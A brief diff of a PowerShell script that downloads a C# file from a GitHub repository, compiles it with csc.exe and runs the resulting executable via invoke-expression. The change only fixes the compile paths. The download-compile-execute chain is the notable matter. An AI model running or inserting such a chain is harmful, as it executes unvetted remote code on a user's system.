@@ -11,7 +11,7 @@ invoke-expression $command
 $my_path_c="C:\temp\up.cs"
 $url_c='https://raw.githubusercontent.com/FurqanKhan1/Dictator/master/up.cs';
 $b.DownloadFile($url_c, $my_path_c) ;
-$command = "cmd /C C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe -out:D:\up.exe D:\up.cs"
+$command = "cmd /C C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe -out:C:\temp\up.exe C:\temp\up.cs"
 invoke-expression $command
 $command="cmd /C C:\temp\up.exe"
 invoke-expression $command
